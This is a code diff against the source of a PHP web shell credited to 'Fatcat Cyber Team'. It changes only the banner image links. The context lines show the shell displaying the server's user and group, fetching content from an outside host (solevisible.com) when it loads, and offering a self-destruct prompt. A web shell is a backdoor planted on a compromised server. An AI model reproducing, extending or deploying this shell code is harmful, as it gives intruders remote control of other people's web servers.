@@ -1109,7 +1109,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="210" height="63" alt="FATCAT CYBER TEAM 2012" draggable="false" src="https://i.ibb.co/w67prYF/Fatcat-Cyber-Team.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="210" height="63" alt="FATCAT CYBER TEAM 2012" draggable="false" src="https://imgur.com/48YgDZL.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1559,7 +1559,7 @@ echo '<div class="header">';
 $news = new AlfaCURL();
 $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
-$about_us = "<pre><center><img src='https://i.ibb.co/w67prYF/Fatcat-Cyber-Team.png'><br>
+$about_us = "<pre><center><img src='https://imgur.com/48YgDZL.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Fatcat Cyber ft Jack007 (FATCAT CYBER TEAM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
@@ -5042,7 +5042,7 @@ echo('</center>');
 if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
 echo "<div class=header>";
 echo "
-<center><p><img src=\"https://i.ibb.co/w67prYF/Fatcat-Cyber-Team.png\"></p>";
+<center><p><img src=\"https://imgur.com/48YgDZL.png\"></p>";
 echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
 echo '</p></center></div>';
 }
